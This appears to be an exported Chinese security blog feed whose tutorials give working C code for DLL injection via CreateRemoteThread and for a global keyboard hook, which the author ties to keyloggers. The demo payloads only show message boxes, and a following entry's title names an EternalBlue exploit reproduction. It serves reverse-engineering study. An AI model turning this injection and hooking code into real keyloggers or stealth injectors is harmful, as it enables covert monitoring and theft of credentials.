<p>为了使远程进程加载 DLL，把 LoadLibrary 函数作为 CreateRemoteThread 的线程函数，要加载的 DLL 路径作为线程函数的参数即可。</p>
<blockquote>
<p>让远程进程执行 LoadLibrary 函数加载 DLL 文件，需解决两个问题：<br>1）获得远程进程中 LoadLibrary 函数的地址：Kernel32.dll 是系统基本库，且 Windows 系统中，所有进程加载 Kernel32.dll 模块基址是固定且一致的，所以只需获取本地进程中 LoadLibrary 地址。<br>2）向远程进程传递需加载 DLL 的路径：通过 Windows API 函数把路径写入远程进程中，使用以下API：OpenProcess、VirtualAllocEx、WriteProcessMemory、VirtualFreeEx。</p>
</blockquote>
<h3 id="0x02-注入过程"><a href="#0x02-注入过程" class="headerlink" title="0x02 注入过程"></a><strong>0x02 注入过程</strong></h3><h4 id="1）获取目标进程句柄"><a href="#1）获取目标进程句柄" class="headerlink" title="1）获取目标进程句柄"></a><strong>1）获取目标进程句柄</strong></h4><p>使用 OpenProcess 函数打开远程进程的句柄。访问权限 dwDesiredAccess 需要设置为 PROCESS_ALL_ACCESS。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE WINAPI <span class="title">OpenProcess</span> <span class="params">(</span></span></div><div class="line">	DWORD 	dwDesiredAccess,	<span class="comment">// 指定所得句柄具有的访问权限</span></div><div class="line">	BOOL  	bInheritHandle,		<span class="comment">// 是否可被继承</span></div><div class="line">	DWORD 	dwProcessId		<span class="comment">// 指定要打开的进程ID</span></div><div class="line">);</div><div class="line"></div><div class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)；</div></pre></td></tr></table></figure></p>
<h4 id="2）在目标进程分配内存空间"><a href="#2）在目标进程分配内存空间" class="headerlink" title="2）在目标进程分配内存空间"></a><strong>2）在目标进程分配内存空间</strong></h4><p>使用 VirtualAllocEx 在目标进程中分配足够的内存空间，用于保存要加载 DLL 的路径。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">LPVOID WINAPI <span class="title">VirtualAllocEx</span> <span class="params">(</span></span></div><div class="line">	HANDLE 	hProcess,	<span class="comment">// 目标进程句柄</span></div><div class="line">	LPVOID	lpAddress,	<span class="comment">// 期望的起始地址，通常置为NULL</span></div><div class="line">	SIZE_T  dwSize,		<span class="comment">// 需分配的内存大小</span></div><div class="line">	DWORD  	flAllocationType, <span class="comment">// 分配内存空间的类型，取 MEM_COMMIT</span></div><div class="line">	DWORD 	flProtect		<span class="comment">// 内存访问权限，指定为可读可写：PAGE_READWRITE</span></div><div class="line">);</div><div class="line"></div><div class="line">pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</div></pre></td></tr></table></figure></p>
<h4 id="3）写入-DLL-路径至目标进程"><a href="#3）写入-DLL-路径至目标进程" class="headerlink" title="3）写入 DLL 路径至目标进程"></a><strong>3）写入 DLL 路径至目标进程</strong></h4><p>用 WriteProcessMemory 函数把需加载的 DLL 路径写入到远程进程分配的内存空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL WINAPI <span class="title">WriteProcessMemory</span> <span class="params">(</span></span></div><div class="line">	HANDLE    hProcess,		<span class="comment">// 目标进程句柄</span></div><div class="line">	LPVOID    lpBaseAddress,	<span class="comment">// 目标进程内存空间首地址</span></div><div class="line">	LPCVOID   lpBuffer,		<span class="comment">// 需写入数据的内存空间地址</span></div><div class="line">	SIZE_T    nSize,			<span class="comment">// 需写入数据字节数</span></div><div class="line">	SIZE_T    *lpNumberOfBytesWritten	  <span class="comment">// 实际写入的字节数，设置为 NULL</span></div><div class="line">);</div><div class="line"></div><div class="line">WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</div></pre></td></tr></table></figure>
<h4 id="4）获取-LoadLibraryW-地址"><a href="#4）获取-LoadLibraryW-地址" class="headerlink" title="4）获取 LoadLibraryW 地址"></a><strong>4）获取 LoadLibraryW 地址</strong></h4><p>Windows 系统中，LoadLibraryW 函数位于 kernel32.dll 中，并且系统核心 DLL 会加载到固定地址，所以系统中所有进程的 LoadLibraryW 函数地址是相同的。用 GetProcAddress 函数获取本地进程 LoadLibraryW 地址即可。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">WINAPI <span class="title">GetProcAddress</span> <span class="params">(</span></span></div><div class="line">	MODULE 	hModule,	  <span class="comment">// 模块句柄</span></div><div class="line">	LPCSTR 	lpProcName	<span class="comment">// 函数名</span></div><div class="line">);</div><div class="line"></div><div class="line">hMod = GetModuleHandle(<span class="string">L"kernel32.dll"</span>);</div><div class="line">pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">"LoadLibraryW"</span>);</div></pre></td></tr></table></figure></p>
<h4 id="5）在目标进程中运行远程线程"><a href="#5）在目标进程中运行远程线程" class="headerlink" title="5）在目标进程中运行远程线程"></a><strong>5）在目标进程中运行远程线程</strong></h4><p>使用 CreateRemoteThread 函数是目标进程调用 LoadLibraryW 函数加载 DLL。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</div></pre></td></tr></table></figure></p>
<h3 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a><strong>0x03 测试</strong></h3><h4 id="1）需注入-DLL-源码"><a href="#1）需注入-DLL-源码" class="headerlink" title="1）需注入 DLL 源码"></a><strong>1）需注入 DLL 源码</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Injectdll.dll</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tchar.h"</span></span></div><div class="line"></div><div class="line">HMODULE g_hMod = <span class="literal">NULL</span>;</div><div class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvReserved)</span></span></div><div class="line">&#123;</div><div class="line">	TCHAR Msg[<span class="number">50</span>] = _T(<span class="string">"Inject to "</span>);</div><div class="line">	TCHAR szPath[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</div><div class="line">	<span class="keyword">if</span>(!GetModuleFileName(g_hMod, szPath, MAX_PATH))</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	_tcscat(Msg, szPath);</div><div class="line"></div><div class="line">	<span class="keyword">switch</span>( dwReason )</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">case</span> DLL_PROCESS_ATTACH:  </div><div class="line">			OutputDebugString(<span class="string">L"Sucess inject &lt;Injectdll.dll&gt; !!"</span>);</div><div class="line">			MessageBox(<span class="literal">NULL</span>, Msg, TEXT(<span class="string">"InjectDll"</span>), MB_OK);  </div><div class="line">			<span class="keyword">break</span>;  </div><div class="line">		<span class="keyword">case</span> DLL_PROCESS_DETACH:  </div><div class="line">			MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"Dll unInjected!!!"</span>), TEXT(<span class="string">"InjectDll"</span>), MB_OK);  </div><div class="line">			<span class="keyword">break</span>;  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> TRUE;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="2）注入程序"><a href="#2）注入程序" class="headerlink" title="2）注入程序"></a><strong>2）注入程序</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Injectmain.cpp</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tchar.h"</span></span></div><div class="line"></div><div class="line"><span class="function">BOOL <span class="title">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span></div><div class="line">&#123;</div><div class="line">	HANDLE hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</div><div class="line">	HMODULE hMod = <span class="literal">NULL</span>;</div><div class="line">	LPVOID pRemoteBuf = <span class="literal">NULL</span>;</div><div class="line">	DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</div><div class="line">	LPTHREAD_START_ROUTINE pThreadProc;</div><div class="line"></div><div class="line">	<span class="comment">// Open target process to inject dll</span></div><div class="line">	<span class="keyword">if</span>( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</div><div class="line">	&#123;</div><div class="line">		_tprintf(<span class="string">L"Fail to open process %d ! [%d]\n"</span>, dwPID, GetLastError());</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// Allocate memory in the remote process big enough for the DLL path name</span></div><div class="line">	pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</div><div class="line"></div><div class="line">	<span class="comment">// Write the DLL path name to the space allocated in the target process</span></div><div class="line">	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">	<span class="comment">// Find the address of LoadLibrary in target process(same to this process)</span></div><div class="line">	hMod = GetModuleHandle(<span class="string">L"kernel32.dll"</span>);</div><div class="line">	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">"LoadLibraryW"</span>);</div><div class="line"></div><div class="line">	<span class="comment">// Create a remote thread in target process</span></div><div class="line">	hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line">	WaitForSingleObject(hThread, INFINITE);</div><div class="line"></div><div class="line">	CloseHandle(hThread);</div><div class="line">	VirtualFreeEx(hProcess, pRemoteBuf, <span class="number">0</span>, MEM_RELEASE);</div><div class="line">	CloseHandle(hProcess);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, TCHAR *argv[])</div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>( argc != <span class="number">3</span> )</div><div class="line">	&#123;</div><div class="line">		_tprintf(<span class="string">L"Usage: %s &lt;pid&gt; &lt;dll_path&gt; \n"</span>, argv[<span class="number">0</span>]);</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// Inject DLL</span></div><div class="line">	<span class="keyword">if</span>( InjectDll((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]) )</div><div class="line">		_tprintf(<span class="string">L"InjectDll &lt;%s&gt;sucess! \n"</span>, argv[<span class="number">2</span>]);</div><div class="line">	<span class="keyword">else</span></div><div class="line">		_tprintf(<span class="string">L"InjectDLL &lt;%s&gt; fail! \n"</span>, argv[<span class="number">2</span>]);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="3）测试效果"><a href="#3）测试效果" class="headerlink" title="3）测试效果"></a><strong>3）测试效果</strong></h4><p>运行 Injectmain.exe 将 DLL 注入到进程 3656（notepad.exe）中，注入成功将弹出消息框。</p>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-5-11/94028700-file_1494473311845_13a5b.png" alt=""><br>查看 notepad.exe 进程加载的模块列表，可以看到 InjectDll.dll 已被加载。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="http://ooyovxue7.bkt.clouddn.com/17-5-11/35149412-file_1494473313402_167fd.png" alt=""></h2><p>References:<br>[1] 逆向工程核心原理<br>[3] <a href="https://etenal.me/archives/871" target="_blank" rel="external">DLL注入浅析（下）</a></p>
]]></content>
      
        <categories>
            
            <category> Windows </category>
            
        </categories>
        
        
        <tags>
            
            <tag> DLL 注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DLL 注入之 Windows 消息钩子]]></title>
      <url>/DLL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96/</url>
      <content type="html"><![CDATA[<p>Windows 下的窗口应用程序是基于事件驱动方式工作的，操作系统中点击鼠标和按下键盘都是一种事件，当事件发生时操作系统会将消息发送给相应的应用程序，应用程序收到消息之后会做出响应。</p>
<blockquote>
<p>钩子(Hook)，是Windows提供的一种截获和监视系统中消息的方法，应用程序可以通过 SetWindowsHook 函数设置钩子以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。当消息到达后，在目标窗口处理函数之前处理它。</p>
</blockquote>
<h3 id="0x01-钩子原理"><a href="#0x01-钩子原理" class="headerlink" title="0x01 钩子原理"></a><strong>0x01 钩子原理</strong></h3><p>操作系统维护这一个链表进行钩子的管理，每设置一个钩子就在钩链中增加一个节点，最新设定的钩子将会最早获得消息的控制权。此外，每个钩子需要设定一个回调函数（钩子函数），在产生指定消息后作出处理。当指定消息发生时，系统会调用这些回调函数。在回调函数中可以监视消息、修改消息，或者屏蔽消息，使消息无法传递到目的窗口。</p>
<p>根据钩子的范围可分为全局钩子和局部钩子，全局钩子可以钩取所有基于消息机制的应用程序，局部钩子只是钩取指定线程的消息。全局钩子将钩子函数放在一个 DLL 中，当某个进程产生指定消息之后，操作系统会自动将该 DLL 注入到该进程中。</p>
<p>常用钩子类型有以下几种：<br>（1）键盘钩子和低级键盘钩子可以监视各种键盘消息。<br>（2）鼠标钩子和低级鼠标钩子可以监视各种鼠标消息。<br>（3）外壳钩子可以监视各种Shell事件消息。比如启动和关闭应用程序。<br>（4）日志钩子可以记录从系统消息队列中取出的各种事件消息。<br>（5）窗口过程钩子监视所有从系统消息队列发往目标窗口的消息。   </p>
<p>Windows 提供消息钩子相关的 API 主要有 SetWindowsHookEx()、CallNextHookEx() 和 UnhookWindowsHookEx()。</p>
<h3 id="0x02-键盘钩子"><a href="#0x02-键盘钩子" class="headerlink" title="0x02 键盘钩子"></a><strong>0x02 键盘钩子</strong></h3><p>键盘记录器是恶意代码中常见的一种类型，木马编写者通常以隐蔽的方式将键盘记录器安装在目标主机以窃取登录凭证等敏感信息。通过消息钩子可以实现一个键盘记录器，但是这种方法极容易被杀毒软件发现。下面通过一个简单的例子演示全局键盘钩子。</p>
<h4 id="1）安装与卸载钩子"><a href="#1）安装与卸载钩子" class="headerlink" title="1）安装与卸载钩子"></a><strong>1）安装与卸载钩子</strong></h4><p>由于是全局消息钩子，所以需要将消息钩子的安装与卸载放在 DLL 中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus    <span class="comment">// If used by C++ code,</span></span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;          <span class="comment">// export the C interface</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">_declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">InstallHook</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hModule, <span class="number">0</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">_declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">UninstallHook</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> (g_hHook)</div><div class="line">	&#123;</div><div class="line">		UnhookWindowsHookEx(g_hHook);</div><div class="line">		g_hHook = <span class="literal">NULL</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure></p>
<p>SetWindowsHookEx 用于安装消息钩子，该函数第二个参数为钩取消息后系统调用的回调函数，函数的返回值为钩子句柄。函数原型如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">HHOOK WINAPI <span class="title">SetWindowsHookExW</span><span class="params">(</span></span></div><div class="line">    _In_ <span class="keyword">int</span> idHook, 					<span class="comment">// type of hook, WH_KEYBOARD is Keyboard hook</span></div><div class="line">    _In_ HOOKPROC lpfn,       <span class="comment">// hook procedure</span></div><div class="line">    _In_opt_ HINSTANCE hmod,  <span class="comment">// handle of hook's DLL</span></div><div class="line">    _In_ DWORD dwThreadId     <span class="comment">// thread ID，0 means global hook</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>UnhookWindowsHookEx 用于卸载消息钩子，它只有一个参数，即需要卸载消息钩子的句柄。</p>
<p>在 DLL 中要将该函数导出供主程序使用，<code>_declspec(dllexport)</code>声明 InstallHook() 和 UninstallHook() 为导出函数。</p>
<h4 id="2）钩子函数"><a href="#2）钩子函数" class="headerlink" title="2）钩子函数"></a><strong>2）钩子函数</strong></h4><p>全局键盘消息钩子会截获所有应用程序的键盘消息，包括系统的控制台程序，为了方便操作，若目标程序为控制台程序（conhost.exe）则直接将消息传递给它；否则当有键盘按下都会弹出消息窗口，并显示按下的按键。具体实现如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(nCode &gt;= <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		<span class="comment">// bit 31 : transition state. 0 =&gt; press, 1 =&gt; release</span></div><div class="line">		<span class="keyword">if</span> (!(lParam &amp; <span class="number">0x80000000</span>))</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">char</span> tcKey[<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">			<span class="keyword">char</span> tcPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</div><div class="line">			<span class="keyword">char</span> *name = <span class="literal">NULL</span>;</div><div class="line">			GetKeyNameTextA(lParam, tcKey, <span class="number">50</span>);  <span class="comment">// Retrieves a string that represents the name of a key</span></div><div class="line">			GetModuleFileNameA(<span class="literal">NULL</span>, tcPath, MAX_PATH);</div><div class="line">			name = <span class="built_in">strrchr</span>(tcPath,<span class="string">'\\'</span>) + <span class="number">1</span> ;</div><div class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,<span class="string">"conhost.exe"</span>))  <span class="comment">// Console Host Process</span></div><div class="line">				<span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</div><div class="line">			<span class="keyword">else</span></div><div class="line">				MessageBoxA(<span class="literal">NULL</span>, tcKey, name, MB_OK);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">	 <span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>GetKeyNameTextA 用于获取按键名字符串。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">GetKeyNameText</span><span class="params">(</span></span></div><div class="line">  _In_  LONG   lParam,  </div><div class="line">  _Out_ LPTSTR lpString,  <span class="comment">// buffer to receive the key name</span></div><div class="line">  _In_  <span class="keyword">int</span>    cchSize    <span class="comment">// The maximum of the key name</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>CallNextHookEx 将消息继续传递给钩子链中下一个钩子函数，直到目标窗口。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">LRESULT WINAPI <span class="title">CallNextHookEx</span><span class="params">(</span></span></div><div class="line">  _In_opt_ HHOOK  hhk,    <span class="comment">// handle of hook</span></div><div class="line">  _In_     <span class="keyword">int</span>    nCode,</div><div class="line">  _In_     WPARAM wParam,</div><div class="line">  _In_     LPARAM lParam</div><div class="line">);</div></pre></td></tr></table></figure></p>
<h4 id="3）测试"><a href="#3）测试" class="headerlink" title="3）测试"></a><strong>3）测试</strong></h4><p>以上即为消息钩子相关的函数，下面调用这些函数测试键盘钩子的效果。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*funptr)</span><span class="params">()</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	HMODULE hDll = <span class="literal">NULL</span>;</div><div class="line">	funptr InstallHook = <span class="literal">NULL</span>;</div><div class="line">	funptr UninstallHook = <span class="literal">NULL</span>;</div><div class="line">	<span class="keyword">char</span> cmd[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"----------------------Command-----------------------\n\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[+] install : Install hook\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[+] uninstall : Uninstall hook\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"----------------------------------------------------\n\n"</span>);</div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">	&#123;</div><div class="line">		gets(cmd);</div><div class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(cmd ,<span class="string">"install"</span>))</div><div class="line">		&#123;</div><div class="line">			hDll = LoadLibraryA(<span class="string">"keyhook.dll"</span>);</div><div class="line">			<span class="keyword">if</span> (hDll == <span class="literal">NULL</span>)</div><div class="line">			&#123;</div><div class="line">				<span class="built_in">printf</span>(<span class="string">"LoadLibrary Fail!\n"</span>);</div><div class="line">				<span class="keyword">return</span>;</div><div class="line">			&#125;</div><div class="line">			InstallHook = (funptr)GetProcAddress(hDll, <span class="string">"InstallHook"</span>);</div><div class="line">			UninstallHook = (funptr)GetProcAddress(hDll, <span class="string">"UninstallHook"</span>);</div><div class="line">			InstallHook();</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"Keyboard hook installed!\n\n"</span>);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(cmd, <span class="string">"uninstall"</span>))</div><div class="line">		&#123;</div><div class="line">			UninstallHook();</div><div class="line">			FreeLibrary(hDll);</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"Sucess to uninstall hook!\n\n"</span>);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在记事本中按下按键，弹出按键值。</p>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-5-8/7397613-file_1494250200322_1341b.png" alt=""></p>
<p>查看记事本进程模块，可以看到 DLL 已成功注入该进程。</p>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-5-8/20626831-file_1494250203063_f29f.png" alt=""></p>
<h3 id="0x03-调试注入到进程中的-DLL"><a href="#0x03-调试注入到进程中的-DLL" class="headerlink" title="0x03 调试注入到进程中的 DLL"></a><strong>0x03 调试注入到进程中的 DLL</strong></h3><p>使用 OllyDbg 可以调试注入到目标进程中的 DLL 文件，具体步骤如下：</p>
<blockquote>
<p>1.运行 notepad.exe，使用 OD attach 运行中的 notepad；<br>2.选项/ 调试选项/ 事件/ 中断于新模块（dll）；<br>3.运行 Hook.exe，安装全局消息钩子；<br>4.在 notepad 中使用键盘输入，keyhook.dll 被注入到 notepad 中；<br>5.OD 暂停调试，并弹出 Executable modules 窗口；<br>6.取消之前设置的 “ 中断于新模块（dll）” ，双击 keyhook.dll 即可到达其 EP 地址处。</p>
</blockquote>
<hr>
<p>References:<br>[1] 逆向工程核心原理<br>[2] <a href="https://lellansin.wordpress.com/2013/08/15/windows-api-%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%83%EF%BC%89-hook-%E9%92%A9%E5%AD%90%E7%9B%91%E5%90%AC%EF%BC%88%E7%BC%96%E5%86%99%E4%B8%AD%EF%BC%89/" target="_blank" rel="external"> Windows API 教程（七）hook 钩子监听</a><br>[3] <a href="https://etenal.me/archives/844" target="_blank" rel="external">DLL注入浅析（上）</a></p>
]]></content>
      
        <categories>
            
            <category> Windows </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hook </tag>
            
            <tag> DLL 注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NSA Enternalblue + Doublepulsar 复现 SMB 漏洞]]></title>
      <url>/NSA%20Enternalblue+Doublepulsar%20%E5%A4%8D%E7%8E%B0%20SMB%20%E6%BC%8F%E6%B4%9E/</url>
